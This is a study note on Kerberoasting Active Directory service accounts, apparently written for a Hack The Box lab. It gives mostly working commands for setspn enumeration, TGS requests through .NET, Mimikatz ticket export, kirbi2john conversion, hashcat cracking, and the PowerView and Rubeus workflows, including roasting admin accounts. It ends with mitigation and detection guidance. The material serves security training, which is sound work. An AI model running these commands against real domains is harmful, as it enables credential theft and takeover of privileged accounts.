## Kerberoasting - Semi Manual method

#### Enumerate SPNs with [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))
``` cmd.exe
setspn.exe -Q */*
```
- This returns all SPNs including computers
	- We are only interested in user accounts

#### Target a Single User
``` powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel

PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

#### Retrieve All Tickets Using setspn.exe
``` powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
- Requires that `Add-Type -AssemblyName System.IdentityModel` be run before
- Now that the tickets are loaded into memory we can extract them with Mimikatz

### Extract Tickets from Memory with Mimikatz
```
mimikatz # base64 /out:true

mimikatz # kerberos::list /export
```
- If we don't use `base64 /out:true` mimikatz will write the extracted ticket to `.kirbi` files. This may be easier depending on exfil needs.
	- If we skip the base64 conversion we can skip to extracting the ticket with `kribi2john`.

#### Prepare the Base64 Blob for Cracking
``` bash
echo "<base64 blob>" |  tr -d \\n | tee encoded_file
```
- Removes new lines and whitespace and writes to a file so we can convert it back to `.kirbi`

#### Place the Output into a File as .kirbi
``` bash
cat encoded_file | base64 -d > sqldev.kirbi
```

#### Extract the Kerberos Ticket using [kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py)
``` bash
wallywhatever@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```

#### Clean up crack_file for Hashcat
``` bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

cat sqldev_tgs_hashcat # make sure it looks good
```

#### Crack with Hashcat
``` bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

___

## Kerberoasting - Automated / Tool Based method

### [Powerview](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)

#### Use PowerView to Extract TGS Tickets
``` powershell
PS C:\htb> Import-Module .\PowerView.ps1

PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

#### Use PowerView to Target a Specific User
``` powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

#### Export All Tickets to a CSV file
``` powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### [Rubeus](https://github.com/GhostPack/Rubeus)

- Has a lot of options like:
	- Performing Kerberoasting and outputting hashes to a file
	- Using alternate credentials
	- Performing Kerberoasting combined with a pass-the-ticket attack
	- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
	- Requesting tickets for accounts passwords set between a specific date range
	- Placing a limit on the number of tickets requested
	- Performing AES Kerberoasting

#### /stats - Gathering Information
``` powershell
.\Rubeus.exe kerberoast /stats
```
![[2023-04-20 12_30_56-Hack The Box - Academy.png|600]]

#### Roast admin accounts
``` powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
- `/nowrap` is used to ease in copy-pasting so we don't need to trim newlines or whitespace

## A Note on Encryption Types 
- Kerberoasting tools usually request RC4 encryption during the attack because its weaker and easier to crack offline than AES
- `$krb5tgs$23$*` - RC4 (23) - hashcat mode 13100
- `$krb5tgs$18$*` - AES-256

#### Using /tgtdeleg
- `/tgtdeleg` flag specifies that we only want RC4 encryption when requesting TGS.
- This does not work against Windows Server 2019 DC.
	- It will always return a service ticket encrypted with the highest level of encryption supported by the target account.

# Mitigation
- It is recommended to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.

- When Kerberoasting is occurring in the environment, we will see an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses, signaling the use of automated Kerberoasting tools.
- Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.
	- Doing so generates two separate event IDs
		- [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested
		- [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed
	- 10-20 TGS requests per account is normal. A large amount of 4769 events from one account may indicate an attack.

This excellent [post](https://adsecurity.org/?p=3458) by Sean Metcalf highlights some mitigation and detection strategies for Kerberoasting.